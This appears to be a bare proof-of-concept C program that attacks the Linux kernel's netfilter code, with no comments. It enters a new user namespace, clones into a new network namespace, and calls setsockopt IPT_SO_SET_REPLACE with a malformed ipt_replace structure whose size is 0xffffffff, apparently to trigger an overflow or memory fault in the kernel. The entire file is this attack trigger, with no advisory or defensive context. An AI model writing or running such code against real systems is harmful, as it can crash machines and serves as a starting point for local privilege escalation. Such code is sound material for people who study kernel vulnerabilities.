#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <linux/sched.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <netinet/in.h>
#include <net/if.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <fcntl.h>

int netfilter_setsockopt(void *p) {
	int sock;
	int ret;
	void *data;
	size_t size;
	struct ipt_replace *repl;

	sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);

	if (sock == -1) {
	        perror("socket");
	        return -1;
	}

	size = sizeof(struct ipt_replace);

	data = malloc(size);

	if (data == NULL) {
		perror("malloc");
		return -1;
	}

	memset(data, 0, size);

	repl = (struct ipt_replace *) data;

	repl->num_counters = 0x1;
	repl->size = 0xffffffff;
	repl->valid_hooks = 0x1;
	repl->num_entries = 0x1;

	ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *) data, size);

	printf("done %d\n", ret);

	return 0;
}

int main(void) {
	void *stack;
	int ret;

	ret = unshare(CLONE_NEWUSER);

	if (ret == -1) {
		perror("unshare");
		return -1;
	}

	stack = (void *) malloc(65536);

	if (stack == NULL) {
		perror("malloc");
		return -1;
	}

	clone(netfilter_setsockopt, stack + 65536, CLONE_NEWNET, NULL);

	sleep(1);

	return 0;
}
